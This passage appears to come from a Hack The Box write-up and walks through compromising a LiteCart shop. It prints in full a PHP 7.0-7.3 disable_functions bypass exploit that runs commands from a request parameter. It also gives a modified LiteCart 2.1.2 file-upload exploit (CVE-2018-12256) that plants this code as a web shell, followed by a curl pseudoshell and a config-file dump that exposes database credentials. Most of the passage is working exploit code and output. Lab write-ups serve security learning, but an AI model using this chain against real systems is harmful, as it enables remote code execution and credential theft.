class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment"># released as of 04/10/2019, specifically:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># PHP 7.0 - 7.0.33</span></span><br><span class="line"><span class="comment"># PHP 7.1 - 7.1.31</span></span><br><span class="line"><span class="comment"># PHP 7.2 - 7.2.23</span></span><br><span class="line"><span class="comment"># PHP 7.3 - 7.3.10</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> pwn(<span class="variable">$cmd</span>) &#123;</span><br><span class="line">    global <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> str2ptr(&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = 0, <span class="variable">$s</span> = 8) &#123;</span><br><span class="line">        <span class="variable">$address</span> = 0;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-1; <span class="variable">$j</span> &gt;= 0; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= 8;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> ptr2str(<span class="variable">$ptr</span>, <span class="variable">$m</span> = 8) &#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; 0xff);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> write(&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = 8) &#123;</span><br><span class="line">        <span class="variable">$i</span> = 0;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; 0xff);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> leak(<span class="variable">$addr</span>, <span class="variable">$p</span> = 0, <span class="variable">$s</span> = 8) &#123;</span><br><span class="line">        global <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, 0x68, <span class="variable">$addr</span> + <span class="variable">$p</span> - 0x10);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != 8) &#123; <span class="variable">$leak</span> %= 2 &lt;&lt; (<span class="variable">$s</span> * 8) - 1; &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> parse_elf(<span class="variable">$base</span>) &#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, 0x20);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, 0x36, 2);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, 0, 4);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, 4, 4);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, 0x10);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, 0x28);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == 1 &amp;&amp; <span class="variable">$p_flags</span> == 6) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == 2 ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == 1 &amp;&amp; <span class="variable">$p_flags</span> == 5) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>) &#123;</span><br><span class="line">        list(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / 8; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * 8);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; 0 &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$text_size</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != 0x746e6174736e6f63)</span><br><span class="line">                    <span class="built_in">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="built_in">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + 4) * 8);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; 0 &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$text_size</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != 0x786568326e6962)</span><br><span class="line">                    <span class="built_in">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="built_in">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> get_binary_base(<span class="variable">$binary_leak</span>) &#123;</span><br><span class="line">        <span class="variable">$base</span> = 0;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; 0xfffffffffffff000;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 0x1000; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - 0x1000 * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, 0, 7);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == 0x10102464c457f) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> get_system(<span class="variable">$basic_funcs</span>) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, 0, 6);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == 0x6d6574737973) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="built_in">return</span> leak(<span class="variable">$addr</span> + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += 0x20;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != 0);</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ryat &#123;</span><br><span class="line">        var <span class="variable">$ryat</span>;</span><br><span class="line">        var <span class="variable">$chtg</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;chtg = <span class="variable">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable">$this</span>-&gt;ryat = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = 10; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, 79);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = unserialize(<span class="variable">$poc</span>);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[0] = ptr2str(0, 79);</span><br><span class="line">    <span class="built_in">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[2][0];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = new Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="keyword">function</span> (<span class="variable">$x</span>) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == 79) &#123;</span><br><span class="line">        die(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, 0);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, 0x58);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - 0xc8;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, 0x60, 2);</span><br><span class="line">    write(<span class="variable">$abc</span>, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, 0x10, <span class="variable">$abc_addr</span> + 0x60);</span><br><span class="line">    write(<span class="variable">$abc</span>, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, 0x20);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, 8);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = 0xd0;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 0x110; <span class="variable">$i</span> += 8) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, 0x20, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, 0xd0 + 0x38, 1, 4); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, 0xd0 + 0x68, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>edit the 45267.py to this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Exploit Title: LiteCart 2.1.2 - Arbitrary File Upload</span></span><br><span class="line"><span class="comment"># Date: 2018-08-27</span></span><br><span class="line"><span class="comment"># Exploit Author: Haboob Team</span></span><br><span class="line"><span class="comment"># Software Link: https://www.litecart.net/downloading?version=2.1.2</span></span><br><span class="line"><span class="comment"># Version: 2.1.2</span></span><br><span class="line"><span class="comment"># CVE : CVE-2018-12256</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Description</span></span><br><span class="line"><span class="comment"># admin/vqmods.app/vqmods.inc.php in LiteCart 2.1.2 allows remote authenticated attackers </span></span><br><span class="line"><span class="comment"># to upload a malicious file (resulting in remote code execution) by using the text/xml </span></span><br><span class="line"><span class="comment"># or application/xml Content-Type in a public_html/admin/?app=vqmods&amp;doc=vqmods request.</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2. Proof of Concept</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import mechanize</span><br><span class="line">import cookielib</span><br><span class="line">import urllib2</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import argparse</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;LiteCart&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;admin login page url - EX: https://IPADDRESS/admin/&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;admin password&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;admin username&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span>(not args.u or not args.t or not args.p):</span><br><span class="line">    sys.exit(<span class="string">&quot;-h for help&quot;</span>)</span><br><span class="line">url = args.t</span><br><span class="line">user = args.u</span><br><span class="line">password = args.p</span><br><span class="line"></span><br><span class="line">br = mechanize.Browser()</span><br><span class="line">cookiejar = cookielib.LWPCookieJar()</span><br><span class="line">br.set_cookiejar( cookiejar )</span><br><span class="line">br.set_handle_equiv( True )</span><br><span class="line">br.set_handle_redirect( True )</span><br><span class="line">br.set_handle_referer( True )</span><br><span class="line">br.set_handle_robots( False )</span><br><span class="line">br.addheaders = [ ( <span class="string">&#x27;User-agent&#x27;</span>, <span class="string">&#x27;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1&#x27;</span> ) ]</span><br><span class="line">response = br.open(url)</span><br><span class="line">br.select_form(name=<span class="string">&quot;login_form&quot;</span>)</span><br><span class="line">br[<span class="string">&quot;username&quot;</span>] = user</span><br><span class="line">br[<span class="string">&quot;password&quot;</span>] = password</span><br><span class="line">res = br.submit()</span><br><span class="line">response = br.open(url + <span class="string">&quot;?app=vqmods&amp;doc=vqmods&quot;</span>)</span><br><span class="line">one=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> form <span class="keyword">in</span> br.forms():</span><br><span class="line">    one= str(form).<span class="built_in">split</span>(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    one= one[1].<span class="built_in">split</span>(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">    one= one[1].<span class="built_in">split</span>(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    one = one[0]</span><br><span class="line">cookies = br._ua_handlers[<span class="string">&#x27;_cookies&#x27;</span>].cookiejar</span><br><span class="line">cookie_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cookies:</span><br><span class="line">    cookie_dict[c.name] = c.value</span><br><span class="line">bypass = open(<span class="string">&#x27;bypass.php&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">        <span class="string">&#x27;vqmod&#x27;</span>: (<span class="string">&quot;mybypass.php&quot;</span>, bypass, <span class="string">&quot;application/xml&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>:one,</span><br><span class="line">        <span class="string">&#x27;upload&#x27;</span>:(None,<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">response = requests.post(url + <span class="string">&quot;?app=vqmods&amp;doc=vqmods&quot;</span>, files=files, cookies=cookie_dict)</span><br><span class="line">r = requests.get(url + <span class="string">&quot;../vqmod/xml/mybypass.php?c=id&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Shell =&gt; &quot;</span> + url + <span class="string">&quot;../vqmod/xml/mybypass.php&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Sorry something went wrong&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>run the script again and we get the link to the code execution:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># python exp.py -t http://10.10.10.207/shop/admin/ -p &#x27;theNextGenSt0r3!~&#x27; -u admin</span></span><br><span class="line">/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> a future release.</span><br><span class="line">  from cryptography import x509</span><br><span class="line">Shell =&gt; http://10.10.10.207/shop/admin/../vqmod/xml/mybypass.php</span><br></pre></td></tr></table></figure>
+
+<p>success:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># curl http://10.10.10.207/shop/vqmod/xml/mybypass.php?c=id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>alright this works, lets create a pseudoshell quick called pshell.sh:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;x for exit&quot;</span></span><br><span class="line">input=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$input</span>&quot;</span> != <span class="string">&quot;x&quot;</span> ]  </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;&gt; &quot;</span></span><br><span class="line">    <span class="built_in">read</span> input</span><br><span class="line">    curl -XPOST http://10.10.10.207/shop/vqmod/xml/mybypass.php --data-urlencode <span class="string">&quot;c=<span class="variable">$input</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>change permissions and run</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># chmod 777 pshell.sh</span></span><br><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># ./pshell.sh</span></span><br><span class="line">x <span class="keyword">for</span> <span class="built_in">exit</span></span><br><span class="line">&gt; <span class="built_in">ls</span></span><br><span class="line">4YQVJ.php</span><br><span class="line">KJUAJ.php</span><br><span class="line">OQZNZ.php</span><br><span class="line">index.html</span><br><span class="line">mybypass.php</span><br><span class="line">&gt; <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">&gt; <span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line">&gt; <span class="built_in">pwd</span></span><br><span class="line">/var/www/html/shop/vqmod/xml</span><br></pre></td></tr></table></figure>
+
+<p>got a database credential</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">cat</span> /var/www/html/shop/includes/config.inc.php</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DB_TYPE&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;changethis&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_DATABASE&#x27;</span>, <span class="string">&#x27;ecom&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// Password Encryption Salt</span><br><span class="line">  define(<span class="string">&#x27;PASSWORD_SALT&#x27;</span>, <span class="string">&#x27;kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>what we can also find out, is that mysql has shell!</p>
